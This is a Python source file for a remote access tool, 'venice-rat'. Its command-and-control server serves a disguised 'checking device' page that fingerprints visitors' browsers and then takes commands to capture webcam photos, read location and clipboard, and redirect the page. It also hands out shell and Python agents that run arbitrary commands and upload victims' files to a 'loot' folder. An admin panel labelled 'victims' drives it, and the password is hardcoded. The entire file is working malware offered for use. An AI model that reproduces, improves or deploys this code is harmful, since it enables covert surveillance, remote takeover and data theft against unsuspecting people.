#!/usr/bin/env python3
# venice-rat.py — C2: deep browser fingerprint + shell agents
import base64, hashlib, json, os, queue, random, secrets, sys, threading, time
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

PASS  = os.environ.get("PASS") or "WoRamn2013"
TOKEN = hashlib.sha256(PASS.encode()).hexdigest()[:32]
LOOT  = os.path.abspath("loot"); os.makedirs(LOOT, exist_ok=True)
DB, SEQ = {}, [0]
POLL = 8
PORT = int(os.environ["PORT"]) if os.environ.get("PORT") else None

def cid():
    SEQ[0] += 1; return str(SEQ[0])

PAGE = r"""<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>ok</title><style>body{background:#0b0d10;color:#c9d1d9;font:13px system-ui;padding:16px}
h1{font-size:16px;color:#fff;margin:0 0 6px}#s{color:#3fb950;font-size:12px;margin-bottom:12px}
table{border-collapse:collapse;width:100%;font-size:11px}td{padding:3px 5px;border-bottom:1px solid #1c2128;
vertical-align:top;word-break:break-all}td:first-child{color:#7d8590;width:36%;white-space:nowrap}
a{display:block;padding:10px;margin-top:8px;background:#21262d;border:1px solid #30363d;
border-radius:7px;color:#c9d1d9;text-decoration:none;text-align:center}</style>
<h1>checking device</h1><div id=s>connecting…</div><table id=t></table>
<a href="/agent.sh">agent.sh</a><a href="/agent.py">agent.py</a><a href="/admin">panel</a>
<script>
const T=localStorage.getItem("vrt")||(Math.random().toString(36).slice(2)+Date.now().toString(36));
localStorage.setItem("vrt",T);
const P=(p,d)=>fetch(p,{method:"POST",body:JSON.stringify(d)}).catch(()=>{});
const row=(k,v)=>{if(v===undefined||v===null||v==="")return;const r=t.insertRow();
 r.insertCell().textContent=k;r.insertCell().textContent=String(v)};
function gpu(){try{const c=document.createElement("canvas").getContext("webgl");
 const e=c.getExtension("WEBGL_debug_renderer_info");
 return e?[c.getParameter(e.UNMASKED_VENDOR_WEBGL),c.getParameter(e.UNMASKED_RENDERER_WEBGL)].join(" | "):"n/a"}
 catch(e){return "n/a"}}
function chash(){try{const c=document.createElement("canvas");c.width=220;c.height=40;
 const x=c.getContext("2d");x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";
 x.fillRect(0,0,220,40);x.fillStyle="#069";x.fillText("venice-rat \u2726 \u00e9\u00e8\u00fc",4,4);
 return c.toDataURL().slice(-96)}catch(e){return "n/a"}}
function aprint(){return new Promise(r=>{try{const C=window.OfflineAudioContext||window.webkitOfflineAudioContext;
 const c=new C(1,44100,44100);const o=c.createOscillator();o.type="triangle";o.frequency.value=10000;
 const f=c.createBiquadFilter();f.type="lowpass";f.frequency.value=800;f.Q.value=0.7;
 o.connect(f);f.connect(c.destination);o.start(0);c.startRendering();
 c.oncomplete=e=>{const b=e.renderedBuffer.getChannelData(0);let s=0;
 for(let i=4500;i<5000;i++)s+=Math.abs(b[i]);r(s.toFixed(6))};
 setTimeout(()=>r("n/a"),3000)}catch(e){r("n/a")}})}
function rtc(){return new Promise(r=>{const o=new Set();let pc;
 try{pc=new RTCPeerConnection({iceServers:[]})}catch(e){return r([])}
 try{pc.createDataChannel("x")}catch(e){}
 pc.onicecandidate=e=>{if(!e.candidate){try{pc.close()}catch(x){};return r([...o])}
  const m=/(\d{1,3}(?:\.\d{1,3}){3})/.exec(e.candidate.candidate);if(m)o.add(m[1])};
 pc.createOffer().then(x=>pc.setLocalDescription(x)).catch(()=>{});
 setTimeout(()=>{try{pc.close()}catch(e){};r([...o])},2500)})}
(async()=>{
  const i={};
  i.ua=navigator.userAgent; i.plat=navigator.platform; i.vendor=navigator.vendor;
  i.lang=navigator.language; i.langs=(navigator.languages||[]).join(",");
  i.cores=navigator.hardwareConcurrency; i.mem=navigator.deviceMemory; i.touch=navigator.maxTouchPoints;
  i.dnt=navigator.doNotTrack; i.cookies=navigator.cookieEnabled; i.pdf=navigator.pdfViewerEnabled;
  i.screen=screen.width+"x"+screen.height; i.avail=screen.availWidth+"x"+screen.availHeight;
  i.depth=screen.colorDepth; i.dpr=devicePixelRatio;
  try{i.orient=screen.orientation.type}catch(e){}
  i.tz=Intl.DateTimeFormat().resolvedOptions().timeZone; i.tzoff=new Date().getTimezoneOffset();
  i.gpu=gpu(); i.canvas=chash(); i.audio=await aprint();
  try{i.voices=(speechSynthesis.getVoices()||[]).length}catch(e){}
  try{const m=await navigator.mediaDevices.enumerateDevices();
    i.cams=m.filter(d=>d.kind==="videoinput").length;
    i.mics=m.filter(d=>d.kind==="audioinput").length}catch(e){}
  try{const e=await navigator.storage.estimate();i.quota=e.quota;i.used=e.usage}catch(e){}
  try{const c=navigator.connection;i.net=c.effectiveType+"/"+c.downlink+"Mb/"+c.rtt+"ms"}catch(e){}
  try{const b=await navigator.getBattery();i.battery=Math.round(b.level*100)+"% chg="+b.charging}catch(e){}
  const l=await rtc(); i.localip=l.join(",");
  for(const k in i) row(k,i[k]);
  await P("/api/register",{token:T,kind:"browser",info:i});
  s.textContent="connected";
  for(;;){try{
    const r=await fetch("/api/poll?t="+T);const x=await r.text();
    if(x.trim()){const a=x.split("\n");await run(a[0],atob(a[1]))}
  }catch(e){await new Promise(r=>setTimeout(r,2000))}}
})();
async function run(id,cmd){
  let o="";const op=cmd.trim().split(/\s+/)[0];
  try{
    if(op==="shot"){const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
      const v=document.createElement("video");v.srcObject=st;await v.play();
      await new Promise(r=>setTimeout(r,700));const c=document.createElement("canvas");
      c.width=v.videoWidth;c.height=v.videoHeight;c.getContext("2d").drawImage(v,0,0);
      st.getTracks().forEach(x=>x.stop());
      await P("/api/upload",{token:T,name:"cam"+Date.now()+".jpg",data:c.toDataURL("image/jpeg",.85).split(",")[1]});
      o="photo "+c.width+"x"+c.height}
    else if(op==="loc"){o=await new Promise(r=>navigator.geolocation.getCurrentPosition(
      p=>r(JSON.stringify(p.coords)),e=>r("ERR "+e.message),{enableHighAccuracy:true,timeout:15000}))}
    else if(op==="clip") o=await navigator.clipboard.readText();
    else if(op==="open"){location.href=cmd.slice(5);o="nav"}
    else if(op==="speak"){speechSynthesis.speak(new SpeechSynthesisUtterance(cmd.slice(6)));o="spoken"}
    else o="browser only: shot loc clip open speak";
  }catch(e){o="ERR "+e.message}
  await P("/api/result",{token:T,id,out:btoa(unescape(encodeURIComponent(o)))});
}
</script>"""

LOGIN = r"""<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>login</title><style>body{background:#0b0d10;color:#c9d1d9;font:14px system-ui;display:flex;
height:100vh;align-items:center;justify-content:center;margin:0}
form{background:#0d1117;border:1px solid #21262d;padding:22px;border-radius:10px;width:270px}
h1{font-size:15px;margin:0 0 14px;color:#fff}
input{width:100%;padding:10px;background:#0b0d10;border:1px solid #30363d;color:#c9d1d9;
border-radius:6px;font:inherit;box-sizing:border-box;outline:0}
input:focus{border-color:#1f6feb}button{width:100%;margin-top:10px;padding:10px;background:#238636;
border:0;color:#fff;border-radius:6px;font:inherit;cursor:pointer}
#e{color:#f85149;font-size:12px;height:16px;margin-top:8px}</style>
<form id=f><h1>password</h1><input id=p type=password autofocus autocomplete=current-password>
<button>enter</button><div id=e></div></form>
<script>f.onsubmit=async ev=>{ev.preventDefault();
 const r=await fetch("/api/login",{method:"POST",body:JSON.stringify({pass:p.value})});
 if(r.ok)location.href="/admin"; else e.textContent="wrong"};</script>"""

AGENT_SH = r"""#!/bin/sh
B="__BASE__"; T="__TOKEN__"; C="$HOME"
jp(){ if command -v curl >/dev/null 2>&1
 then curl -sS -m 30 -H 'Content-Type: application/json' --data-binary "$2" "$B$1" >/dev/null 2>&1
 else wget -q -O /dev/null --post-data="$2" "$B$1" 2>/dev/null; fi; }
gt(){ if command -v curl >/dev/null 2>&1; then curl -s -m 40 "$B$1"; else wget -q -O - "$B$1" 2>/dev/null; fi; }
jp /api/register "{\"token\":\"$T\",\"kind\":\"sh\",\"info\":{\"uname\":\"$(uname -a 2>/dev/null|tr -d '"')\",\"user\":\"$(id -un 2>/dev/null)\",\"id\":\"$(id 2>/dev/null)\",\"home\":\"$HOME\",\"pwd\":\"$(pwd)\"}}"
while :; do
 R=$(gt "/api/poll?t=$T"); [ -z "$R" ] && { sleep 1; continue; }
 I=$(printf '%s\n' "$R"|sed -n 1p); X=$(printf '%s\n' "$R"|sed -n 2p|base64 -d 2>/dev/null)
 [ -z "$I" ] && continue
 case "$X" in
  exit) break;;
  "cd "*) C=$(cd "$C" 2>/dev/null && cd "${X#cd }" 2>/dev/null && pwd); O="cwd $C";;
  "dl "*) F="${X#dl }"; case "$F" in /*);; *) F="$C/$F";; esac
    if [ -f "$F" ]; then jp /api/upload "{\"token\":\"$T\",\"name\":\"$(basename "$F")\",\"data\":\"$(base64 "$F"|tr -d '\n')\"}"; O="sent"; else O="missing $F"; fi;;
  *) O=$(cd "$C" 2>/dev/null; eval "$X" 2>&1);;
 esac
 jp /api/result "{\"token\":\"$T\",\"id\":\"$I\",\"out\":\"$(printf %s "$O"|base64|tr -d '\n')\"}"
done
"""

AGENT_PY = r'''#!/usr/bin/env python3
import base64,getpass,json,os,platform,subprocess,sys,urllib.request
B="__BASE__"; T="__TOKEN__"
def p(u,o):
    try: return urllib.request.urlopen(urllib.request.Request(B+u,data=json.dumps(o).encode(),
        headers={"Content-Type":"application/json"}),timeout=30).read()
    except Exception: return b""
def g(u):
    try: return urllib.request.urlopen(B+u,timeout=40).read()
    except Exception: return b""
p("/api/register",{"token":T,"kind":"py","info":{"uname":platform.platform(),
  "user":getpass.getuser(),"node":platform.node(),"py":sys.version.split()[0],"cwd":os.getcwd()}})
c=os.getcwd()
while True:
    r=g("/api/poll?t="+T).decode()
    if not r.strip(): continue
    l=r.split("\n"); i=l[0]; x=base64.b64decode(l[1]).decode()
    if x.strip()=="exit": break
    if x.startswith("cd "):
        try: os.chdir(os.path.expanduser(x[3:].strip())); c=os.getcwd(); o="cwd "+c
        except Exception as e: o="ERR %s"%e
    elif x.startswith("dl "):
        try: p("/api/upload",{"token":T,"name":os.path.basename(x[3:].strip()),
            "data":base64.b64encode(open(x[3:].strip(),"rb").read()).decode()}); o="sent"
        except Exception as e: o="ERR %s"%e
    else:
        try:
            q=subprocess.run(x,shell=True,cwd=c,capture_output=True,text=True,timeout=180)
            o=(q.stdout+q.stderr) or "(no output)"
        except Exception as e: o="ERR %s"%e
    p("/api/result",{"token":T,"id":i,"out":base64.b64encode(o.encode()).decode()})
'''

ADMIN_PAGE = r"""<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>panel</title><style>
*{box-sizing:border-box}body{margin:0;background:#0b0d10;color:#c9d1d9;font:12px ui-monospace,monospace;display:flex;height:100vh}
#l{width:190px;border-right:1px solid #21262d;overflow:auto;flex:none}
.d{padding:7px;border-bottom:1px solid #161b22;cursor:pointer;font-size:11px;line-height:1.4}
.d.on{background:#1f6feb33;border-left:2px solid #1f6feb}
#l h2{font-size:10px;color:#7d8590;padding:8px;margin:0;display:flex;justify-content:space-between}
#l h2 a{color:#58a6ff;text-decoration:none}
#r{flex:1;display:flex;flex-direction:column;min-width:0}
#o{flex:1;overflow:auto;padding:9px;white-space:pre-wrap;word-break:break-word;font-size:11px}
#inf{padding:8px;font-size:11px;color:#8b949e;border-bottom:1px solid #21262d;white-space:pre-wrap;
max-height:34vh;overflow:auto}
#f{display:flex;gap:5px;padding:7px;border-top:1px solid #21262d}
#i{flex:1;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px;border-radius:6px;font:inherit;outline:0}
button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:8px 11px;border-radius:6px;font:inherit}
.ok{color:#3fb950}</style>
<div id=l><h2><span>victims <b id=n>0</b></span><a href="#" id=out>exit</a></h2><div id=list></div></div>
<div id=r><div id=inf>pick one</div><div id=o></div>
<div id=f><input id=i placeholder="shot / loc / clip / ls" autocomplete=off><button id=b>run</button></div></div>
<script>
let cur=null,seen=0,t=null;
const d64=s=>{try{return new TextDecoder().decode(Uint8Array.from(atob(s),c=>c.charCodeAt(0)))}catch(e){return"?b"}};
const ln=(x,c)=>{const e=document.createElement("div");e.textContent=x;if(c)e.style.color=c;
 o.appendChild(e);o.scrollTop=o.scrollHeight};
async function load(){
 const r=await fetch("/api/devices").then(x=>x.json()).catch(()=>[]);
 n.textContent=r.length;list.innerHTML="";
 r.forEach(v=>{const e=document.createElement("div");e.className="d"+(v.token===cur?" on":"");
  e.innerHTML="<b>"+v.kind+"</b> "+(v.online?'<span class=ok>on</span>':'off')+"<br>"+
   (v.localip||"?")+"<br>"+v.ip;e.onclick=()=>pick(v.token);list.appendChild(e)});
 if(!cur&&r.length)pick(r[0].token);
}
async function pick(tk){cur=tk;o.innerHTML="";
 const d=await fetch("/api/device?t="+tk).then(x=>x.json()).catch(()=>({}));
 inf.textContent="private: "+(d.info&&d.info.localip||"?")+"\npublic: "+d.ip+
  "\nxff: "+(d.xff||"-")+"\nstatus: "+(d.online?"ONLINE":"offline "+d.ago+"s")+
  "\nua: "+(d.ua||"-")+"\n\n"+JSON.stringify(d.info,null,1);
 seen=d.on||0;clearInterval(t);t=setInterval(tick,1200)}
async function tick(){
 const r=await fetch("/api/out?t="+cur+"&after="+seen).then(x=>x.json()).catch(()=>({items:[]}));
 (r.items||[]).forEach(x=>{seen=x.n+1;ln(d64(x.out))});
}
document.getElementById("b").onclick=async()=>{
 const c=i.value.trim();if(!c||!cur)return;ln("$ "+c,"#58a6ff");i.value="";
 const r=await fetch("/api/exec",{method:"POST",headers:{"Content-Type":"application/json"},
  body:JSON.stringify({token:cur,cmd:c})}).then(x=>x.json()).catch(()=>({}));
 ln(r.ok?"queued":"fail: "+r.err,"#d29922")};
i.onkeydown=e=>{if(e.key==="Enter")document.getElementById("b").click()};
document.getElementById("out").onclick=async e=>{e.preventDefault();
 await fetch("/api/logout",{method:"POST"});location.href="/admin"};
load();setInterval(load,3000);
</script>"""

class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def log_message(self, *a): pass
    def s(self, b, ct="text/plain", code=200, hdrs=None):
        if isinstance(b, str): b = b.encode()
        self.send_response(code); self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(b))); self.send_header("Connection", "close")
        for k, v in (hdrs or []): self.send_header(k, v)
        self.end_headers()
        try: self.wfile.write(b)
        except Exception: pass
    def j(self, o, code=200): self.s(json.dumps(o), "application/json", code)
    def b(self):
        n = int(self.headers.get("Content-Length") or 0)
        if n <= 0: return {}
        try: return json.loads(self.rfile.read(n))
        except Exception: return {}
    def host(self):
        pub = os.environ.get("RENDER_EXTERNAL_URL")
        if pub: return pub.rstrip("/")
        return "http://" + self.headers.get("Host", "127.0.0.1")
    def ip(self):
        x = self.headers.get("X-Forwarded-For")
        return x.split(",")[0].strip() if x else self.client_address[0]
    def authed(self):
        for part in (self.headers.get("Cookie") or "").split(";"):
            k, _, v = part.strip().partition("=")
            if k == "vr" and v == TOKEN: return True
        return False
    def cookie(self):
        sec = "; Secure" if (self.headers.get("X-Forwarded-Proto") == "https"
                              or os.environ.get("RENDER_EXTERNAL_URL")) else ""
        return [("Set-Cookie", "vr=%s; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400%s" % (TOKEN, sec))]

    def do_GET(self):
        u = urlparse(self.path); q = parse_qs(u.query); p = u.path
        if p == "/": return self.s(PAGE, "text/html")
        if p == "/admin":
            if not self.authed(): return self.s(LOGIN, "text/html")
            return self.s(ADMIN_PAGE, "text/html")
        if p == "/agent.sh":
            return self.s(AGENT_SH.replace("__BASE__", self.host()).replace("__TOKEN__", secrets.token_hex(5)))
        if p == "/agent.py":
            return self.s(AGENT_PY.replace("__BASE__", self.host()).replace("__TOKEN__", secrets.token_hex(5)))
        if p == "/api/poll":
            d = DB.get(q.get("t", [""])[0])
            if not d: return self.s("")
            d["seen"] = time.time()
            try: it = d["q"].get(timeout=POLL)
            except queue.Empty: return self.s("")
            return self.s("%s\n%s" % (it["id"], it["b64"]))
        if p == "/api/device":
            if not self.authed(): return self.j({})
            d = DB.get(q.get("t", [""])[0])
            if not d: return self.j({})
            return self.j({"online": time.time() - d["seen"] < 40, "ip": d["ip"], "xff": d["xff"],
                           "ua": d["ua"], "info": d["info"], "on": d["on"],
                           "ago": int(time.time() - d["seen"])})
        if p == "/api/devices":
            if not self.authed(): return self.j([])
            return self.j([{"token": t, "kind": d["kind"], "ip": d["ip"],
                            "localip": d["info"].get("localip", ""),
                            "online": time.time() - d["seen"] < 40} for t, d in DB.items()])
        if p == "/api/out":
            if not self.authed(): return self.j({"items": []})
            d = DB.get(q.get("t", [""])[0])
            if not d: return self.j({"items": []})
            a = int(q.get("after", ["0"])[0])
            return self.j({"items": [x for x in d["out"] if x["n"] >= a]})
        if p == "/api/file":
            if not self.authed(): return self.s("nope", code=404)
            d = DB.get(q.get("t", [""])[0]); nm = q.get("name", [""])[0]
            if not d or not nm: return self.s("nope", code=404)
            fp = os.path.join(LOOT, d["token"], os.path.basename(nm))
            if not os.path.isfile(fp): return self.s("nope", code=404)
            return self.s(open(fp, "rb").read(), "application/octet-stream")
        self.s("nope", code=404)

    def do_POST(self):
        p = urlparse(self.path).path; b = self.b()
        if p == "/api/login":
            if b.get("pass") == PASS: return self.j({"ok": True}, hdrs=self.cookie())
            return self.j({"ok": False}, 403)
        if p == "/api/logout":
            return self.j({"ok": True}, hdrs=[("Set-Cookie", "vr=; Path=/; Max-Age=0")])
        if p == "/api/register":
            tk = b.get("token") or secrets.token_hex(5)
            d = DB.setdefault(tk, {"token": tk, "q": queue.Queue(), "out": [], "info": {},
                                   "on": 0, "ip": "", "xff": "", "ua": "", "seen": 0, "kind": "?"})
            d["kind"] = b.get("kind", "?"); d["ip"] = self.ip()
            d["xff"] = self.headers.get("X-Forwarded-For", "")
            d["ua"] = self.headers.get("User-Agent", "")[:400]
            d["info"].update(b.get("info") or {}); d["seen"] = time.time()
            return self.j({"ok": True})
        if p == "/api/exec":
            if not self.authed(): return self.j({"ok": False, "err": "auth"}, 403)
            d = DB.get(b.get("token", ""))
            if not d: return self.j({"ok": False, "err": "gone"}, 404)
            d["q"].put({"id": cid(), "b64": base64.b64encode(b.get("cmd", "").encode()).decode()})
            return self.j({"ok": True})
        if p == "/api/result":
            d = DB.get(b.get("token", ""))
            if not d: return self.j({})
            d["out"].append({"n": d["on"], "out": b.get("out", "")}); d["on"] += 1
            d["seen"] = time.time(); d["out"][:] = d["out"][-500:]
            return self.j({"ok": True})
        if p == "/api/upload":
            d = DB.get(b.get("token", ""))
            if not d: return self.j({})
            nm = os.path.basename(b.get("name") or "f")
            os.makedirs(os.path.join(LOOT, d["token"]), exist_ok=True)
            raw = base64.b64decode((b.get("data") or "").split(",")[-1] or b"")
            open(os.path.join(LOOT, d["token"], nm), "wb").write(raw)
            d["out"].append({"n": d["on"], "out": base64.b64encode(("saved "+nm).encode()).decode()})
            d["on"] += 1
            return self.j({"ok": True})
        self.s("nope", code=404)

if __name__ == "__main__":
    srv = None
    base = PORT or random.randint(8400, 8999)
    for i in range(200):
        try:
            srv = ThreadingHTTPServer(("0.0.0.0", base + i), H, bind_and_activate=False)
            srv.server_bind(); srv.server_activate(); break
        except OSError: srv = None
    if not srv: raise SystemExit("no free port")
    pub = os.environ.get("RENDER_EXTERNAL_URL") or "http://127.0.0.1:%d" % base
    print("up on %d" % base)
    print("panel: %s/admin  (password: %s)" % (pub, PASS))
    try: srv.serve_forever()
    except KeyboardInterrupt: pass
